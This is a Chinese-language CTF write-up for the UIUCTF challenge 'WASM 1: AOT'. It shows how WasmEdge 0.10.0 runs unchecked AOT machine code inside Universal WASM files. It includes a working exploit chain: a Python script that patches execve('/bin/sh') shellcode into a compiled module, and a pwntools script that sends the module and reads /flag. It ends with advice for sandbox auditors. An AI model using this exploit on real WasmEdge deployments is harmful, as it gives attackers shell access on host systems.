# WASM 1: AOT

## 题目简述

服务接收一段不超过 4095 个十六进制字符的 WebAssembly 文件，再用 WasmEdge 0.10.0 调用导出的 `main(i32) -> i32`：

```c
WasmEdge_VMRunWasmFromBuffer(
    VMCxt, wasm_data, len, FuncName,
    Params, 1, Returns, 1
);
```

程序没有启用 WASI 等宿主扩展，普通 WASM 代码无法直接打开 `/flag`。突破点是 WasmEdge 支持“Universal WASM”：文件除标准字节码外，还能携带 AOT 编译得到的宿主机器码。0.10.0 运行时会直接执行该本机代码，而题目版本没有校验机器码是否仍与原始 WASM 逻辑对应。

构建参数 `-DWASMEDGE_BUILD_AOT_RUNTIME=OFF` 的名字容易误导。仓库官方说明和本地测试表明，这个选项关闭的是构建侧 AOT 编译能力，并没有让已构建的运行库拒绝 Universal WASM 中的 AOT 代码。

## 解题过程

### 生成合法 Universal WASM 外壳

先写一个接口符合要求的普通模块，例如：

```wat
(module
  (export "main" (func $main))
  (func $main (param i32) (result i32)
    (local.get 0)
    (i32.const 5)
    (i32.shl)
    (local.get 0)
    (i32.xor)
  )
)
```

用 `wat2wasm` 生成标准 WASM，再在带 WasmEdge 编译器的环境中生成 Universal WASM：

```bash
wat2wasm sample.wat -o sample.wasm
wasmedgec sample.wasm compiled.wasm
```

这样得到的 `compiled.wasm` 既有正常 WASM 结构，也有自定义 `wasmedge` 段及其宿主架构代码，能够通过加载器的格式检查。

### 替换 AOT 宿主指令

对仓库提供的 `compiled.wasm` 反汇编或与 `malicious.wasm` 做字节比较，可确认导出函数的本机实现从文件偏移 `0xc2` 开始。原位置是约 29 字节的算术函数；前 26 字节可等长替换为 AMD64 `execve("/bin/sh", 0, 0)` shellcode：

```python
from pathlib import Path

wasm = bytearray(Path("compiled.wasm").read_bytes())
shellcode = bytes.fromhex(
    "48b82f62696e2f736800"  # mov rax, 0x0068732f6e69622f
    "50"                  # push rax
    "4889e7"              # mov rdi, rsp
    "31f6"                # xor esi, esi
    "31d2"                # xor edx, edx
    "b83b000000"          # mov eax, 59
    "0f05"                # syscall
    "c3"                  # ret
)

assert len(shellcode) == 0x1a
wasm[0xc2:0xc2 + len(shellcode)] = shellcode
Path("malicious.wasm").write_bytes(wasm)
```

偏移 `0xc2` 只适用于仓库内这份编译产物。通用复现时应从 AOT 自定义段解析函数入口，或对本机代码反汇编后重新定位，不能假设所有 WasmEdge 版本和所有模块都有相同偏移。

### 发送文件并读取 flag

服务要求输入十六进制文本，因此将整个恶意 Universal WASM 编码后发送，再提供任意 32 位参数：

```python
from pathlib import Path
from pwn import *

payload = Path("malicious.wasm").read_bytes().hex().encode()
assert len(payload) <= 4095

io = remote(HOST, PORT)
io.sendlineafter(b"WASM file", payload)
io.sendlineafter(b"integer input: ", b"0")
io.sendline(b"cat /flag")
print(io.recvuntil(b"}").decode())
```

运行时把 AOT 函数映射为可执行代码并在调用 `main` 时进入被替换的指令，由此获得 shell，最终读出：

```text
uiuctf{c4n_y0u_3ven_ca1l_th1s_a_z3ro_d4y???_56fba7b4}
```

## 方法总结

- 核心技巧：保留合法 Universal WASM 容器结构，只替换其中未经完整性校验的 AOT 宿主机器码，使沙箱直接执行 `execve` shellcode。
- 识别信号：嵌入式 WASM 运行时支持 AOT/Universal 格式，输入文件可携带本机代码，而应用仅从 buffer 加载并运行，没有重新编译或验证代码与字节码的一致性。
- 复用要点：审计沙箱时不能只看 WASI 是否启用，还要检查自定义段、AOT cache、反序列化代码和可执行映射。构建选项名称也不能代替运行验证；必须确认实际二进制是否仍包含 AOT loader/runtime 路径。
